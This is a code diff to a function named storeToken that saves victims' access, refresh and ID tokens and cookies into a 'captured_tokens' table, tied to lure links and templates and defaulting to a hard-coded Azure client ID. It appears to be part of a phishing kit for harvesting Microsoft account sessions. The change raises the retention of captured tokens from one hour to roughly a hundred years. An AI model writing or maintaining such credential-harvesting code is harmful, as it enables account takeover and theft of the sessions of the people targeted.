@@ -344,8 +344,8 @@ async function storeToken(job, tokenData, responseCookies = []) {
     const clientIdUsed = config.AZURE_CLIENT_ID || 'd3590ed6-52b3-4102-aeff-aad2292ab01c';
 
     const [result] = await db.query(
-      `INSERT INTO captured_tokens (user_id, link_id, email, token_type, access_token_encrypted, refresh_token_encrypted, id_token_encrypted, cookies_encrypted, ip_address, user_agent, expiration, tenant, template_type, client_id)
-       VALUES (?, ?, ?, 'token', ?, ?, ?, ?, ?, ?, DATE_ADD(NOW(), INTERVAL 1 HOUR), ?, ?, ?)`,
+       `INSERT INTO captured_tokens (user_id, link_id, email, token_type, access_token_encrypted, refresh_token_encrypted, id_token_encrypted, cookies_encrypted, ip_address, user_agent, expiration, tenant, template_type, client_id)
+        VALUES (?, ?, ?, 'token', ?, ?, ?, ?, ?, ?, DATE_ADD(NOW(), INTERVAL 876000 HOUR), ?, ?, ?)`,
       [
         job.user_id,
         job.link_id,
